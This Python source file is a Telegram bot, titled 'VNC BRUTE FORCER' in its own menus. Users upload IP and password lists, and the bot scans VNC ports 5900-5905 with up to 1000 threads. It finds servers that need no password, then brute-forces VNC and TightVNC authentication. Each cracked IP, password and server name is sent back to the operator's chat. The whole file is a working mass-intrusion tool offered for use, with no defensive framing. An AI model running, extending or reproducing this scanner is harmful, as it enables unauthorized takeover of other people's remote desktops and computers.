import os
import asyncio
import socket
import threading
import time
from queue import Queue
from datetime import datetime
import struct
import d3des
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
from telegram.constants import ParseMode

OWNER_ID = int(os.getenv('OWNER_ID', '0'))
BOT_TOKEN = os.getenv('BOT_TOKEN', '')

sudo_users = set()
user_states = {}
active_scans = {}

VNC_PORTS = [5900, 5901, 5902, 5903, 5904, 5905]

def format_time(seconds):
    if seconds < 0:
        seconds = 0
    hours = int(seconds // 3600)
    minutes = int((seconds % 3600) // 60)
    secs = int(seconds % 60)
    return f"{hours}:{minutes:02d}:{secs:02d}"

class VNCScanner:
    def __init__(self, chat_id, bot, scan_threads=1000, scan_timeout=5, brute_timeout=5):
        self.chat_id = chat_id
        self.bot = bot
        self.scan_threads = scan_threads
        self.scan_timeout = scan_timeout
        self.brute_timeout = brute_timeout
        self.queue = Queue()
        self.brute_queue = Queue()
        self.results = []
        self.lock = threading.Lock()
        self.file_lock = threading.Lock()
        self.total_servers = 0
        self.checked_servers = 0
        self.passwords = []
        self.running = True
        self.start_time = None
        self.message_id = None
        self.current_password = ""
        self.loop = None
        self.stopped = False
        self.active_threads = 0
        self.phase = "NULL_SCAN"
        self.null_servers = []
        self.cracked_ips = set()
        self.results_file = f'results_{chat_id}_null.txt'
        
    def load_ips(self, content):
        ips = []
        for line in content.split('\n'):
            line = line.strip()
            if line and not line.startswith('#'):
                if ':' in line:
                    ip, port = line.split(':')
                    ips.append((ip.strip(), int(port)))
                else:
                    for port in VNC_PORTS:
                        ips.append((line.strip(), port))
        return ips
        
    def load_passwords(self, content):
        passwords = []
        for line in content.split('\n'):
            line = line.strip()
            if line and not line.startswith('#'):
                passwords.append(line)
        return passwords
    
    def save_hit_to_file(self, result):
        with self.file_lock:
            try:
                with open(self.results_file, 'a') as f:
                    f.write(result + '\n')
            except Exception as e:
                print(f"Error saving: {e}")
        
    def vnc_handshake(self, sock):
        try:
            version = sock.recv(12)
            if not version.startswith(b'RFB '):
                return None, None
            sock.sendall(version)
            num_sec_types = sock.recv(1)
            if len(num_sec_types) == 0:
                return None, None
            num_types = num_sec_types[0]
            if num_types == 0:
                return None, None
            sec_types = sock.recv(num_types)
            return version.decode('utf-8', errors='ignore').strip(), sec_types
        except:
            return None, None
            
    def get_server_name(self, sock):
        try:
            sock.recv(2)
            sock.recv(2)
            sock.recv(16)
            name_length_data = sock.recv(4)
            if len(name_length_data) == 4:
                name_length = struct.unpack('!I', name_length_data)[0]
                if name_length > 0 and name_length < 1024:
                    name = sock.recv(name_length)
                    return name.decode('utf-8', errors='ignore')
        except:
            pass
        return "None"
        
    def check_vnc_null(self, ip, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.scan_timeout)
            sock.connect((ip, port))
            version, sec_types = self.vnc_handshake(sock)
            if version is None:
                sock.close()
                return False, None
            if sec_types and 1 in sec_types:
                sock.sendall(b'\x01')
                result = sock.recv(4)
                if len(result) == 4:
                    auth_result = struct.unpack('!I', result)[0]
                    if auth_result == 0:
                        sock.sendall(b'\x01')
                        server_name = self.get_server_name(sock)
                        sock.close()
                        return True, server_name
            sock.close()
            return False, None
        except:
            return False, None
    
    def check_vnc_auth(self, ip, port, password):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.brute_timeout)
            sock.connect((ip, port))
            version, sec_types = self.vnc_handshake(sock)
            if version is None:
                sock.close()
                return False, None
            
            # Type 2: Standard VNC Authentication
            if sec_types and 2 in sec_types:
                try:
                    sock.sendall(b'\x02')
                    challenge = sock.recv(16)
                    if len(challenge) != 16:
                        sock.close()
                        return False, None
                    key = (password + '\x00' * 8)[:8].encode('latin-1')
                    response = d3des.desencrypt(key, challenge)
                    sock.sendall(response)
                    result = sock.recv(4)
                    if len(result) == 4:
                        auth_result = struct.unpack('!I', result)[0]
                        if auth_result == 0:
                            sock.sendall(b'\x01')
                            server_name = self.get_server_name(sock)
                            sock.close()
                            return True, server_name
                except Exception as e:
                    print(f"[VNC AUTH ERROR] {ip}:{port} Type 2 - {e}")
                    pass
            
            # Type 16: Tight VNC Authentication
            if sec_types and 16 in sec_types:
                try:
                    sock.sendall(b'\x10')
                    
                    # Read number of tunnel types
                    tunnel_count = sock.recv(4)
                    if len(tunnel_count) == 4:
                        num_tunnels = struct.unpack('!I', tunnel_count)[0]
                        if num_tunnels > 0:
                            tunnels = sock.recv(16 * num_tunnels)
                    
                    # Send no tunneling
                    sock.sendall(struct.pack('!I', 0))
                    
                    # Read number of auth types
                    auth_count = sock.recv(4)
                    if len(auth_count) == 4:
                        num_auths = struct.unpack('!I', auth_count)[0]
                        if num_auths > 0:
                            auths = sock.recv(16 * num_auths)
                            
                            # Check if VNC auth (2) is available
                            for i in range(num_auths):
                                auth_type = struct.unpack('!I', auths[i*16:i*16+4])[0]
                                if auth_type == 2:
                                    # Send auth type 2
                                    sock.sendall(struct.pack('!I', 2))
                                    
                                    # Standard VNC auth flow
                                    challenge = sock.recv(16)
                                    if len(challenge) == 16:
                                        key = (password + '\x00' * 8)[:8].encode('latin-1')
                                        response = d3des.desencrypt(key, challenge)
                                        sock.sendall(response)
                                        result = sock.recv(4)
                                        if len(result) == 4:
                                            auth_result = struct.unpack('!I', result)[0]
                                            if auth_result == 0:
                                                sock.sendall(b'\x01')
                                                server_name = self.get_server_name(sock)
                                                sock.close()
                                                return True, server_name
                                    break
                except Exception as e:
                    print(f"[VNC AUTH ERROR] {ip}:{port} Type 16 - {e}")
                    pass
            
            # Type 5: RA2 (RealVNC)
            if sec_types and 5 in sec_types:
                try:
                    sock.sendall(b'\x05')
                    # RA2 uses RSA + AES encryption - very complex
                    # For now, just try to get generator/modulus
                    gen_len = sock.recv(2)
                    if len(gen_len) == 2:
                        g_len = struct.unpack('!H', gen_len)[0]
                        generator = sock.recv(g_len)
                        mod_len = sock.recv(2)
                        if len(mod_len) == 2:
                            m_len = struct.unpack('!H', mod_len)[0]
                            modulus = sock.recv(m_len)
                            # RA2 requires full RSA/AES implementation
                            # Skip for now - too complex
                except Exception as e:
                    print(f"[VNC AUTH ERROR] {ip}:{port} Type 5 (RA2) - {e}")
                    pass
            
            # Type 18: Tight + VeNCrypt
            if sec_types and 18 in sec_types:
                try:
                    sock.sendall(b'\x12')
                    # VeNCrypt negotiation
                    version = sock.recv(2)
                    if len(version) == 2:
                        # Send version 0.2
                        sock.sendall(b'\x00\x02')
                        ack = sock.recv(1)
                        if len(ack) == 1 and ack[0] == 0:
                            # Get subtypes
                            subtype_count = sock.recv(1)
                            if len(subtype_count) == 1:
                                num_subtypes = subtype_count[0]
                                subtypes = sock.recv(num_subtypes * 4)
                                # Try to use plain VNC auth if available
                                # This is complex - skip for now
                except Exception as e:
                    print(f"[VNC AUTH ERROR] {ip}:{port} Type 18 (VeNCrypt) - {e}")
                    pass
            
            sock.close()
            return False, None
        except Exception as e:
            print(f"[VNC ERROR] {ip}:{port} - {e}")
            return False, None
            
    def null_worker(self):
        while self.running:
            try:
                item = self.queue.get(timeout=1)
            except:
                continue
            if item is None:
                break
            
            with self.lock:
                self.active_threads += 1
            
            ip, port = item
            
            if not self.running:
                with self.lock:
                    self.active_threads -= 1
                break
                
            success, server_name = self.check_vnc_null(ip, port)
            if success:
                result = f"{ip}:{port}-null-[{server_name}]"
                with self.lock:
                    self.results.append(result)
                    self.cracked_ips.add(f"{ip}:{port}")
                self.save_hit_to_file(result)
                if self.loop:
                    asyncio.run_coroutine_threadsafe(self.send_hit(result), self.loop)
            else:
                with self.lock:
                    self.null_servers.append((ip, port))
            
            with self.lock:
                self.checked_servers += 1
                self.active_threads -= 1
    
    def brute_worker(self):
        while self.running:
            try:
                item = self.brute_queue.get(timeout=1)
            except:
                continue
            if item is None:
                break
            
            with self.lock:
                self.active_threads += 1
            
            ip, port = item
            ip_port_key = f"{ip}:{port}"
            
            if not self.running:
                with self.lock:
                    self.active_threads -= 1
                break
            
            with self.lock:
                if ip_port_key in self.cracked_ips:
                    self.checked_servers += 1
                    self.active_threads -= 1
                    continue
            
            for pwd in self.passwords:
                if not self.running:
                    break
                with self.lock:
                    self.current_password = pwd
                success, server_name = self.check_vnc_auth(ip, port, pwd)
                if success:
                    result = f"{ip}:{port}-{pwd}-[{server_name}]"
                    with self.lock:
                        self.results.append(result)
                    self.save_hit_to_file(result)
                    if self.loop:
                        asyncio.run_coroutine_threadsafe(self.send_hit(result), self.loop)
                    break
            
            with self.lock:
                self.checked_servers += 1
                self.active_threads -= 1
    
    def stop(self):
        self.running = False
        self.stopped = True
            
    async def send_hit(self, result):
        text = f"<b>HIT FOUND</b>\n\n<code>{result}</code>"
        try:
            await self.bot.send_message(chat_id=self.chat_id, text=text, parse_mode=ParseMode.HTML)
        except:
            pass
            
    async def update_progress(self):
        while self.running:
            await asyncio.sleep(3)
            if not self.running:
                break
            with self.lock:
                hits = len(self.results)
                current_pwd = self.current_password
                active = self.active_threads
            elapsed = time.time() - self.start_time
            
            if current_pwd:
                trying_text = f'Trying "{current_pwd}"'
            else:
                trying_text = f'Checking null passwords'
            
            text = (
                f"<b>VNC SCANNER STATUS</b>\n"
                f"<b>Hits Found:</b> {hits}\n"
                f"<b>Elapsed:</b> {format_time(elapsed)}\n"
                f"<b>Active Threads:</b> {active}\n"
                f"<b>Timeout:</b> {self.scan_timeout}s\n"
                f"{trying_text}"
            )
            keyboard = [[InlineKeyboardButton("STOP SCAN", callback_data=f"stop_{self.chat_id}")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            try:
                if self.message_id:
                    await self.bot.edit_message_text(
                        chat_id=self.chat_id,
                        message_id=self.message_id,
                        text=text,
                        parse_mode=ParseMode.HTML,
                        reply_markup=reply_markup
                    )
            except:
                pass
                
    async def run(self, ips_content, passwords_content):
        try:
            self.loop = asyncio.get_event_loop()
            
            ips = self.load_ips(ips_content)
            self.passwords = self.load_passwords(passwords_content)
            self.total_servers = len(ips)
            self.start_time = time.time()
            
            if os.path.exists(self.results_file):
                os.remove(self.results_file)
            
            print(f"[START] {len(ips)} servers, {len(self.passwords)} passwords")
            
            msg = await self.bot.send_message(
                chat_id=self.chat_id,
                text=f"<b>SCAN STARTED</b>\n\n<b>Servers:</b> {self.total_servers}\n<b>Passwords:</b> {len(self.passwords)}\n<b>Threads:</b> {self.scan_threads}",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("STOP", callback_data=f"stop_{self.chat_id}")]])
            )
            self.message_id = msg.message_id
            
            # Start progress
            update_task = asyncio.create_task(self.update_progress())
            
            # PHASE 1
            print(f"[P1] Starting threads...")
            threads = []
            for i in range(self.scan_threads):
                t = threading.Thread(target=self.null_worker, daemon=True)
                t.start()
                threads.append(t)
            
            print(f"[P1] Adding to queue...")
            for ip_info in ips:
                self.queue.put(ip_info)
            
            print(f"[P1] Waiting for completion...")
            # Wait for queue to be empty AND all threads to finish working
            while not self.queue.empty() or self.active_threads > 0:
                await asyncio.sleep(0.5)
                if not self.running:
                    break
            
            print(f"[P1] Stopping threads...")
            for _ in range(self.scan_threads):
                self.queue.put(None)
            
            for t in threads:
                t.join(timeout=2)
            
            print(f"[P1 DONE] Null:{len(self.cracked_ips)} Brute:{len(self.null_servers)}")
            
            # PHASE 2
            if self.running and len(self.null_servers) > 0 and len(self.passwords) > 0:
                print(f"[P2] Starting threads...")
                self.phase = "BRUTE_FORCE"
                self.checked_servers = 0
                
                threads = []
                for i in range(self.scan_threads):
                    t = threading.Thread(target=self.brute_worker, daemon=True)
                    t.start()
                    threads.append(t)
                
                print(f"[P2] Adding to queue...")
                for ip_info in self.null_servers:
                    self.brute_queue.put(ip_info)
                
                print(f"[P2] Waiting for completion...")
                # Wait for queue to be empty AND all threads to finish working
                while not self.brute_queue.empty() or self.active_threads > 0:
                    await asyncio.sleep(0.5)
                    if not self.running:
                        break
                
                print(f"[P2] Stopping threads...")
                for _ in range(self.scan_threads):
                    self.brute_queue.put(None)
                
                for t in threads:
                    t.join(timeout=2)
                
                print(f"[P2 DONE] Hits:{len(self.results)}")
            
            self.running = False
            update_task.cancel()
            
            elapsed = time.time() - self.start_time
            print(f"[DONE] {len(self.results)} hits in {elapsed:.2f}s")
            
            await self.bot.edit_message_text(
                chat_id=self.chat_id,
                message_id=self.message_id,
                text=f"<b>SCAN COMPLETED</b>\n\n<b>Hits:</b> {len(self.results)}\n<b>Time:</b> {format_time(elapsed)}",
                parse_mode=ParseMode.HTML
            )
            
            if len(self.results) > 0 and os.path.exists(self.results_file):
                with open(self.results_file, 'rb') as f:
                    await self.bot.send_document(
                        chat_id=self.chat_id,
                        document=f,
                        filename=f'results_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
                    )
        
        finally:
            if self.chat_id in active_scans:
                del active_scans[self.chat_id]

def is_authorized(user_id):
    return user_id == OWNER_ID or user_id in sudo_users

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("Not authorized.")
        return
        
    keyboard = [
        [InlineKeyboardButton("START SCAN", callback_data="new_scan")],
        [InlineKeyboardButton("SETTINGS", callback_data="settings")],
    ]
    if user_id == OWNER_ID:
        keyboard.append([InlineKeyboardButton("SUDO USERS", callback_data="sudo_menu")])
        
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("<b>VNC BRUTE FORCER</b>\n\nSelect option", reply_markup=reply_markup, parse_mode=ParseMode.HTML)

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    
    try:
        await query.answer()
    except:
        pass
    
    if not is_authorized(user_id):
        return
        
    if query.data == "new_scan":
        if user_id in active_scans:
            await query.edit_message_text("Already scanning")
            return
        if user_id not in user_states:
            user_states[user_id] = {}
        user_states[user_id]["step"] = "waiting_ips"
        await query.edit_message_text("Send IP list file")
        
    elif query.data == "settings":
        if user_id not in user_states:
            user_states[user_id] = {}
        if "settings" not in user_states[user_id]:
            user_states[user_id]["settings"] = {"threads": 1000, "scan_timeout": 5, "brute_timeout": 5}
        s = user_states[user_id]["settings"]
        keyboard = [
            [InlineKeyboardButton(f"Threads: {s['threads']}", callback_data="set_threads")],
            [InlineKeyboardButton(f"Scan Timeout: {s['scan_timeout']}s", callback_data="set_scan_timeout")],
            [InlineKeyboardButton(f"Brute Timeout: {s['brute_timeout']}s", callback_data="set_brute_timeout")],
            [InlineKeyboardButton("BACK", callback_data="back_main")]
        ]
        await query.edit_message_text("<b>SETTINGS</b>", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.HTML)
        
    elif query.data.startswith("set_"):
        setting = query.data.replace("set_", "")
        if user_id not in user_states:
            user_states[user_id] = {}
        user_states[user_id]["step"] = f"setting_{setting}"
        await query.edit_message_text(f"Send value for {setting.replace('_', ' ')}")
    
    elif query.data == "sudo_menu":
        if user_id != OWNER_ID:
            await query.answer("Only owner can access")
            return
        sudo_list = "\n".join([f"- {uid}" for uid in sudo_users]) if sudo_users else "No sudo users"
        keyboard = [
            [InlineKeyboardButton("ADD SUDO", callback_data="add_sudo")],
            [InlineKeyboardButton("REMOVE SUDO", callback_data="remove_sudo")],
            [InlineKeyboardButton("BACK", callback_data="back_main")]
        ]
        await query.edit_message_text(f"<b>SUDO USERS</b>\n\n{sudo_list}", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.HTML)
    
    elif query.data == "add_sudo":
        if user_id != OWNER_ID:
            return
        if user_id not in user_states:
            user_states[user_id] = {}
        user_states[user_id]["step"] = "add_sudo"
        await query.edit_message_text("Send user ID to add as sudo")
    
    elif query.data == "remove_sudo":
        if user_id != OWNER_ID:
            return
        if user_id not in user_states:
            user_states[user_id] = {}
        user_states[user_id]["step"] = "remove_sudo"
        await query.edit_message_text("Send user ID to remove from sudo")
        
    elif query.data == "back_main":
        keyboard = [[InlineKeyboardButton("START SCAN", callback_data="new_scan")], [InlineKeyboardButton("SETTINGS", callback_data="settings")]]
        if user_id == OWNER_ID:
            keyboard.append([InlineKeyboardButton("SUDO USERS", callback_data="sudo_menu")])
        await query.edit_message_text("<b>VNC BRUTE FORCER</b>", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.HTML)
        
    elif query.data.startswith("stop_"):
        chat_id = int(query.data.split("_")[1])
        if chat_id in active_scans:
            active_scans[chat_id].stop()

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_authorized(user_id) or user_id not in user_states:
        return
        
    state = user_states[user_id]
    
    if state.get("step") == "waiting_ips":
        if update.message.document:
            file = await context.bot.get_file(update.message.document.file_id)
            content = await file.download_as_bytearray()
            state["ips_content"] = content.decode('utf-8')
            state["step"] = "waiting_passwords"
            await update.message.reply_text("Now send password file")
        
    elif state.get("step") == "waiting_passwords":
        if update.message.document:
            file = await context.bot.get_file(update.message.document.file_id)
            content = await file.download_as_bytearray()
            state["passwords_content"] = content.decode('utf-8')
            
            if "settings" not in state:
                state["settings"] = {"threads": 1000, "scan_timeout": 5, "brute_timeout": 5}
            s = state["settings"]
            
            scanner = VNCScanner(user_id, context.bot, s["threads"], s["scan_timeout"], s["brute_timeout"])
            active_scans[user_id] = scanner
            
            asyncio.create_task(scanner.run(state["ips_content"], state["passwords_content"]))
            del user_states[user_id]
            
    elif state.get("step", "").startswith("setting_"):
        setting = state["step"].replace("setting_", "")
        try:
            value = int(update.message.text)
            if "settings" not in state:
                state["settings"] = {"threads": 1000, "scan_timeout": 5, "brute_timeout": 5}
            state["settings"][setting] = value
            await update.message.reply_text(f"{setting} set to {value}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("BACK", callback_data="settings")]]))
        except:
            await update.message.reply_text("Invalid number")
    
    elif state.get("step") == "add_sudo":
        try:
            sudo_id = int(update.message.text)
            sudo_users.add(sudo_id)
            await update.message.reply_text(f"User {sudo_id} added as sudo", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("BACK", callback_data="sudo_menu")]]))
        except:
            await update.message.reply_text("Invalid user ID")
        if user_id in user_states:
            del user_states[user_id]
    
    elif state.get("step") == "remove_sudo":
        try:
            sudo_id = int(update.message.text)
            if sudo_id in sudo_users:
                sudo_users.remove(sudo_id)
                await update.message.reply_text(f"User {sudo_id} removed from sudo", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("BACK", callback_data="sudo_menu")]]))
            else:
                await update.message.reply_text("User not in sudo list")
        except:
            await update.message.reply_text("Invalid user ID")
        if user_id in user_states:
            del user_states[user_id]

def main():
    if not BOT_TOKEN or OWNER_ID == 0:
        print("Set BOT_TOKEN and OWNER_ID")
        return
        
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.ALL, handle_message))
    
    print("Bot started")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
